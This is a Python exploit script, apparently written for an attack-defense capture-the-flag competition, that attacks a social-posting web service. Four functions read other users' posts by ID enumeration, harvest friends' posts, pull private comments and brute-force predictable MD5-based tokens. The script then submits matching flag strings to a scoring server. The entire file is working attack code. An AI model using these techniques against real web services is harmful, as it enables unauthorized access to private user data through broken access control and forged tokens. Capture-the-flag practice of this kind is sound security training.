from api import Api
import sys
import random, string, re, requests
from generations import generations
import hashlib


FLAG_REGEXP = re.compile(r"[a-zA-Z0-9]{31}=")

def get_random_string(max_len:int = 20) -> str:
    return "".join(random.choices(string.ascii_letters+string.digits, k=random.randint(5, max_len)))


def get_flags(text: str) -> list:
    return FLAG_REGEXP.findall(text)


def sploit1(hostname: str) -> list:
    api = Api(hostname)
    username = get_random_string()
    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())

    bark = get_random_string()
    r = api.add_bark(username, bark)
    bark_id = int(r.text.split(bark)[0].split("/get_bark/")[1][0:-3])

    flags = []
    for i in range(1, bark_id):
        r = api.get_bark(i)
        if r is not None:
            flags += get_flags(r.text)
    return flags

def sploit2(hostname: str) -> list:
    api = Api(hostname)
    username = get_random_string()
    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())

    token = api.generate_token()
    flags = []
    for page_n in range(0, 5):
        users_list = api.api_get_users(token, page_n)
        for user in users_list:
            api.add_friend(user["username"])
            r = api.get_user_barks(user["username"])
            if r:
                flags += get_flags(r.text)
        if not users_list:
            break

    return flags


def sploit3(hostname: str) -> list:
    api = Api(hostname)
    username = get_random_string()
    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())


    token = api.generate_token()
    flags = []
    for page_n in range(0, 10):
        barks_list = api.api_get_last_barks(token, page_n)
        for bark in barks_list:
            bark_id = bark["id"]
            comments = api.api_comments(token, bark_id)
            flags += [comment["text"] for comment in comments if comment["is_private"] and FLAG_REGEXP.match(comment["text"])]
        if not barks_list:
            break

    return flags


def sploit4(hostname: str) -> list:
    api = Api(hostname)
    username = get_random_string()
    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())

    token = api.generate_token()
    flags = []
    tokens = []
    bark_ids = []
    for page_n in range(0, 1):
        users_list = api.api_get_users(token, page_n)
        for user in users_list:
            for generation in generations:
                token = hashlib.md5(f"{user}{generation}".encode()).hexdigest()
                r = api.api_index(token)
                if r:
                    print(token)
                    tokens.append(token)

        barks_list = api.api_get_last_barks(token, page_n)
        for bark in barks_list:
            bark_ids.append(bark["id"])
    print(tokens)
    print(bark_ids)
    return flags

HOSTNAME = sys.argv[1]
TOKEN = sys.argv[2]
#print(f"[*] Flags from 1 sploit: {sploit1(HOSTNAME)}")
#flags = sploit2(HOSTNAME)
#print(f"[*] Flags from 2 sploit: {flags}")
#flags = sploit3(HOSTNAME)
#print(f"[*] Flags from 3 sploit: {flags}")
flags = sploit4(HOSTNAME)
print(f"[*] Flags from 4 sploit: {flags}")
r = requests.put("http://10.118.0.10/flags", headers={"X-Team-Token": TOKEN}, json=flags)

            